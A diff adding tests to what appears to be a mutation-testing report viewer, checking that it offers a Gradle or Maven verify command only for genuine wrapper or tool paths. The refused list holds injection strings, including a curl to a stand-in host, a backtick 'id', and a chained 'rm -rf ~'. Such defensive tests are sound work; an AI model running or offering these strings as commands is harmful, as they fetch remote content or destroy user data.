@@ -246,6 +246,45 @@ describe('a report written to break the page', () => {
   });
 });
 
+// The Gradle or Maven a Java run used starts its commands: the wrapper by a path from where it ran,
+// or absolute, after `sh` when it isn't executable, or the tool on the PATH. Those are offered;
+// anything else that only looks like one isn't, as it could be any program.
+describe('a build tool\'s commands', () => {
+  const offered = ['mvn mutastic:verify', 'gradle :mutasticVerify', 'gradlew :mutasticVerify', './gradlew :mutasticVerify',
+    'sh ./gradlew :mutasticVerify', 'sh ./mvnw mutastic:verify', '../gradlew :mutasticVerify', 'sh ../../mvnw mutastic:verify',
+    './build/gradlew :mutasticVerify', '/home/you/repo/gradlew :mutasticVerify', 'sh /home/you/repo/gradlew :mutasticVerify',
+    '/home/you/repo/mvnw mutastic:verify', '/opt/gradle-8.2.1/bin/gradle :mutasticVerify', '/usr/local/bin/mvn mutastic:verify',
+    '.\\gradlew.bat :mutasticVerify', '..\\mvnw.cmd mutastic:verify', 'C:\\Users\\RUNNER~1\\repo\\gradlew.bat :mutasticVerify',
+    'D:\\repo\\mvnw.cmd mutastic:verify'];
+  const refused = ['sh evil :mutasticVerify', 'sh -c ./gradlew :mutasticVerify', 'bash ./gradlew :mutasticVerify', 'sh gradle :mutasticVerify',
+    './evil :mutasticVerify', './gradlew.sh :mutasticVerify', 'gradle/../evil :mutasticVerify', '../gradle :mutasticVerify',
+    '/tmp/$(curl evil.example)/gradlew :mutasticVerify', '/tmp/`id`/gradlew :mutasticVerify', "'/my repo'/gradlew :mutasticVerify",
+    '/my repo/gradlew :mutasticVerify', '%TEMP%\\gradlew.bat :mutasticVerify', '$HOME/gradlew :mutasticVerify', '~/gradlew :mutasticVerify',
+    'C:\\evil.exe :mutasticVerify', 'sh .\\gradlew.bat :mutasticVerify', '/repo/gradlew; rm -rf ~ :mutasticVerify',
+    './gradlew :mutasticVerify -p x\\y', 'mvnx mutastic:verify', ' ./gradlew :mutasticVerify'];
+  const with_ = (launcher) => {
+    const json = JSON.parse(JAVA);
+    json.mutastic.commands = { verify: `${launcher} -Dmutastic.mutant=<id>` };
+    return JSON.stringify(json);
+  };
+
+  test('starts with the wrapper or tool the run used, however it was found', async () => {
+    for (const launcher of offered) {
+      const page = await open(with_(launcher), '#/m/m855c8e3c');
+      assert.ok((await page.text('main')).includes(`${launcher} -Dmutastic.mutant=m855c8e3c`), launcher);
+      await page.close();
+    }
+  });
+
+  test('offers nothing that only looks like one', async () => {
+    for (const launcher of refused) {
+      const page = await open(with_(launcher), '#/m/m855c8e3c');
+      assert.doesNotMatch(await page.text('main'), /-Dmutastic\.mutant=/, launcher);
+      await page.close();
+    }
+  });
+});
+
 describe('what the tests let through', () => {
   const at = (line) => ({ start: { line, column: 5 }, end: { line, column: 7 } });
   const json = report({
